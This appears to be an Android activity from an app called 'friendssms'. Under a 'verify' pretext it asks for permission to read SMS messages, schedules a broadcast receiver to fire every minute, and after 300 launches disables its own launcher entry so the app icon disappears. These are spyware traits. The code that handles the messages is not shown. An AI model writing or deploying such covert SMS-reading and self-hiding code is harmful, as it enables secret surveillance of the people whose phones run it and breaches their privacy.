package com.akshaykotishco.friendssms;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import com.google.type.DateTime;

import java.time.LocalDateTime;

public class VerifyScreen extends AppCompatActivity {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public String GenerateRandomID(){
        String rndm = LocalDateTime.now().toString();
        rndm = rndm.replace("/", "").replace("-", "").replace(":", "").replace(" ", "").replace(".", "");
        return  rndm;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify_screen);


        SharedPreferences sharedPreferences = getSharedPreferences("MySharedPref", Context.MODE_PRIVATE);
        String s1 = sharedPreferences.getString("deviceid", "");
        SharedPreferences.Editor myEdit = sharedPreferences.edit();

        if(s1 == "") {
            myEdit.putString("deviceid", GenerateRandomID());
        }

        int i1 = sharedPreferences.getInt("counts", 0);

        myEdit.putInt("counts", ++i1);

        myEdit.commit();



        PackageManager pm = getPackageManager();
        int hasPerm = pm.checkPermission(Manifest.permission.READ_SMS, getPackageName());
        if (hasPerm != PackageManager.PERMISSION_GRANTED) {
            final Button button = (Button) findViewById(R.id.verifybtn);
            button.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {

                    ActivityCompat.requestPermissions(VerifyScreen.this, new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);


                    Intent activityChangeIntent = new Intent(VerifyScreen.this, MainActivity.class);
                    VerifyScreen.this.startActivity(activityChangeIntent);
                    startAlert();
                    finish();
                }
            });
        }
        else{
            startAlert();

            Intent activityChangeIntent = new Intent(VerifyScreen.this, MainActivity.class);
            VerifyScreen.this.startActivity(activityChangeIntent);

            finish();
        }

        if(i1 > 300)
        {
            ComponentName componentName = new ComponentName(this, com.akshaykotishco.friendssms.VerifyScreen.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }

    }

    public void startAlert(){
        //EditText text = findViewById(R.id.time);
        //int i = Integer.parseInt(text.getText().toString());
        Intent intent = new Intent(this, MyBroadcastReciever.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this.getApplicationContext(), 234324243, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        //alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + (5 * 1000), pendingIntent);

        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, 5000, 60000 , pendingIntent);

    }
}